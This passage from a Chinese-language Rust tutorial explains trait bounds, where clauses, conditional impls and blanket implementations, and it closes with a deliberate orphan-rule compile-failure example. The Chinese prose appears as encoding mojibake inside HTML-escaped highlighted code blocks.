&lt;p>Trait å¯ä»¥å’Œæ³›å‹ç¼–ç¨‹å¾ˆå¥½çš„ç»“åˆä½¿ç”¨ï¼Œå¯ç”¨äºä¸ºæ³›å‹ç±»å‹æä¾›ç‰¹å¾çº¦æŸï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">notify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Summary&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Breaking news! &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">summarize&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>impl Trait&lt;/code> å®é™…ä¸Šæ˜¯ &lt;em>trait bound&lt;/em> çš„è¯­æ³•ç³–ï¼Œä¸Šè¿°ä»£ç å’Œä¸‹é¢çš„ä»£ç ç­‰ä»·ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">notify&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Summary&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Breaking news! &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">summarize&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="å¤šé‡ç‰¹å¾çº¦æŸ">å¤šé‡ç‰¹å¾çº¦æŸ&lt;/h4>
&lt;p>é€šè¿‡ &lt;code>+&lt;/code> æ“ä½œç¬¦æ”¯æŒå¤šé‡ç‰¹å¾çº¦æŸï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">notify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Summary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Display&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç­‰ä»·äºï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">notify&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Summary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Display&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="åœ¨-where-å­å¥ä¸­å®šä¹‰-trait-bound">åœ¨ &lt;code>where&lt;/code> å­å¥ä¸­å®šä¹‰ Trait Bound&lt;/h4>
&lt;p>åœ¨æ³›å‹å‚æ•°å’Œçº¦æŸè¾ƒå¤šæ—¶ï¼Œè¿™ç§æ–¹å¼ç›¸å¯¹ä¼šæ›´åŠ æ¸…æ™°ä¸€äº›ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">some_function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">U&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">u&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">U&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kt">i32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nc">where&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Display&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Clone&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">U&lt;/span>: &lt;span class="nb">Clone&lt;/span> &lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="ä½¿ç”¨ç‰¹å¾çº¦æŸæœ‰æ¡ä»¶åœ°å®ç°æ–¹æ³•">ä½¿ç”¨ç‰¹å¾çº¦æŸæœ‰æ¡ä»¶åœ°å®ç°æ–¹æ³•&lt;/h4>
&lt;p>è¿™ä¸ªåŠŸèƒ½å¾ˆæœ‰æ„æ€ï¼Œå¯ä»¥ä¸ºæ³›å‹çš„ç‰¹å®šç±»å‹ï¼ˆå®ç°äº†æŸäº› trait çš„ç±»å‹ï¼‰å¢åŠ é¢å¤–çš„æ–¹æ³•å®šä¹‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">fmt&lt;/span>::&lt;span class="n">Display&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">Self&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="bp">Self&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Display&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">PartialOrd&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// è¯¥æ–¹æ³•ä»…åœ¨ T å®ç°äº† Display + PartialOrd æ—¶å¯ç”¨ã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">cmp_display&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;The largest member is x = &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;The largest member is y = &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="ä¸€æ½å­å®ç°--blanket-implementations">ä¸€æ½å­å®ç° (&lt;em>Blanket Implementations&lt;/em>)&lt;/h4>
&lt;p>è¿™ä¸ªåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œåœ¨æ ‡å‡†åº“ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ä¸ºå®ç°äº† Display trait çš„ä»»æ„ç±»å‹å®ç° ToString trait
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Display&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">ToString&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// --snip--
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªç±»å‹åªè¦å®ç°äº† &lt;code>Display&lt;/code> trait, ä¾¿è‡ªåŠ¨å®ç°äº† &lt;code>ToString&lt;/code> traitï¼ˆå…è´¹è·å¾—è¯¥æ¥å£ï¼‰, å¯ä»¥å¯¹å…¶è°ƒç”¨ &lt;code>to_string&lt;/code> æ–¹æ³•ï¼ˆè¯¥æ–¹æ³•ç”± &lt;code>ToString&lt;/code> trait å®šä¹‰ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªç±»å‹éœ€è¦æ”¯æŒè½¬æ¢æˆ &lt;code>String&lt;/code>, æˆ‘ä»¬ä¸€èˆ¬å®ç° &lt;code>Display&lt;/code> trait å³å¯ã€‚&lt;/p>
&lt;p>Blanket implementations ä¹Ÿéœ€è¦éµå®ˆ&lt;a href="https://mincodes.com/posts/traits-in-rust/#%E5%AD%A4%E5%84%BF%E8%A7%84%E5%88%99--orphan-rule">å­¤å„¿è§„åˆ™ (Orphan Rule)&lt;/a>ï¼Œè€Œä¸”æƒ…å†µä¼šæ›´åŠ å¤æ‚ä¸€äº›ã€‚è¯·å‚è€ƒä¸‹é¢è¿™ä¸ªé”™è¯¯ç¤ºèŒƒï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="nc">Position&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="kt">usize&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="kt">usize&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">enum&lt;/span> &lt;span class="nc">Offset&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Forward&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">usize&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Backward&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">usize&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">trait&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Document&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// è·å–ä¸€äº›æ–‡æ¡£çš„ä¸Šä¸‹æ–‡ä¿¡æ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// å°è¯•ä¸ºå®ç°äº† Document trait çš„ä»»æ„ç±»å‹å®ç° AddAssign trait
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ç¼–è¯‘å¤±è´¥â—
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Document&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">ops&lt;/span>::&lt;span class="n">AddAssign&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Offset&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">add_assign&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rhs&lt;/span>: &lt;span class="nc">Offset&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
